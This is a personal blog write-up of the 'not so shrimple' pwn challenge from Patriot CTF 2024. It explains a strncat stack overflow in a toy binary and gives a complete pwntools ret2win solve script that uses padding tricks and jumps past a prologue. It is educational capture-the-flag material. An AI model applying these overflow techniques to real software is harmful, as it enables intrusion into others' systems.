---
title: "patriot ctf 2024"
date: 2024-10-03T16:56:10+10:00
draft: false
toc: false
Summary: "Getting pwn'ed by a n00b challenge."
images:
tags:
  - ctf
  - pwn
---

## not so shrimple
This was a challenge I thought I would solve in an hour or so but ended up taking most of my weekend. Lets take a look!

Checksec showed nothing to scary!

<img src="/images/patriot_ctf/checksec.PNG" alt="checksec" class="img-medium">

<img src="/images/patriot_ctf/main.PNG" alt="main" class="img-medium">

Its a program that takes our text and shrimps it!, just meaning it prepends some text. Lets have a look at the source code.

```c
void main(void)

{
  char local_88 [64];
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined2 local_28;
  undefined local_26;
  
  puts("Welcome to the shrimplest challenge! It is so shrimple, we\'ll give you 3 shots.");
  for (i = 0; i < 3; i = i + 1) {
    printf("Remember to just keep it shrimple!\n>> ");
    fgets(local_88,0x32,stdin);
    puts("Adding shrimp...");
    local_48 = 0x2079736165206f73;
    local_40 = 0x73206f7320646e61;
    local_38 = 0x2c656c706d697268;
    local_30 = 0x7566206576616820;
    local_28 = 0x216e;
    local_26 = 0;
    strncat((char *)&local_48,local_88,0x32);
    printf("You shrimped the following: %s\n",&local_48);
  }
  puts("That\'s it, hope you did something cool...");
  return;
}
```

As fgets is limited to `0x32` characters we cant just simply overwrite the return address on the stack. We have to use the strncat to append our payload to the text "so easy and so shrimple, have fun!".

If we poke around elsewhere we can see this challenge is a ret2win and there is a function called `shrimp` that prints the flag.

```c
void shrimp(void)

{
  int iVar1;
  FILE *__stream;
  char local_9;
  
  __stream = fopen("/flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Flag file not found, contact an admin!");
  }
  else {
    iVar1 = fgetc(__stream);
    local_9 = (char)iVar1;
    while (local_9 != -1) {
      putchar((int)local_9);
      iVar1 = fgetc(__stream);
      local_9 = (char)iVar1;
    }
    fclose(__stream);
  }
  return;
}

```

Using pwntools we can get the address of the `shrimp` function.
```python
e = ELF('./shrimple')
print(hex(e.symbols['shrimp'])) 
```

I initally found the offset required for our payload to overwrite the return address on the stack but there was a bit of a problem.


<img src="/images/patriot_ctf/problembytes.PNG" alt="problembytes" class="img-medium">

We can see that their is some garbage left in memory at critical bytes when we try overwrite the return address. We can see that `0x7ffe3b731938` in the red circle is the return address. The problem comes with the concatination as the address we have to place will be cut short as their are `\x00`'s in the buffer.

This took me the longest time to figure out how to zeroize those bits, we have to use the first two attempts with enough padding to ensure that \x00 are in the right place for the win address to not be mangled.

If we use the first two attempts we can fill in these bytes at the right offset to ensure that the return address is preserved.

<img src="/images/patriot_ctf/better_frame.PNG" alt="better_frame" class="img-medium">

We can not see in GDB that the two critical bytes are zeroized.

<img src="/images/patriot_ctf/call_stack.PNG" alt="call_stack" class="img-medium">


its also important that we dont jump to the start of the function as we want to skip the usual stackframe setup as it may segault.
```x86
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined shrimp()
             undefined         AL:1           <RETURN>
             undefined1        Stack[-0x9]:1  local_9                                 XREF[4]:     004012c1(W), 
                                                                                                   004012c6(R), 
                                                                                                   004012dd(W), 
                                                                                                   004012e0(R)  
             undefined8        Stack[-0x18]:8 local_18                                XREF[5]:     0040129c(W), 
                                                                                                   004012a0(R), 
                                                                                                   004012b5(R), 
                                                                                                   004012d1(R), 
                                                                                                   004012e6(R)  
                             shrimp                                          XREF[3]:     Entry Point(*), 00402148, 
                                                                                          00402210(*)  
        0040127d f3 0f 1e fa     ENDBR64
        00401281 55              PUSH       RBP
        00401282 48 89 e5        MOV        RBP,RSP
        00401285 48 83 ec 10     SUB        RSP,0x10
        00401289 48 8d 35        LEA        RSI,[DAT_00402008]                               = 72h    r
                 78 0d 00 00
        00401290 48 8d 3d        LEA        RDI,[s_/flag.txt_0040200a]                       = "/flag.txt"
                 73 0d 00 00

```

The final solve script looked like the following
```py
from pwn import *
from pwnlib.util.packing import p64
context.log_level = 'DEBUG'
elf=context.binary=ELF('./shrimple')

context(terminal=['tmux', 'splitw', '-h'])

io = gdb.debug('./shrimple', '''
    b *main+251
    continue
''')

win_addr = p64(elf.sym['shrimp']+5)

io.readuntil('>>')
io.sendline(b'a'*43+b'\x00')
io.readuntil('>>')
io.sendline(b'b'*42+b'\x00')
io.readuntil('>>')

payload = b'c' * 38 + win_addr
io.sendline(payload)
io.interactive()
```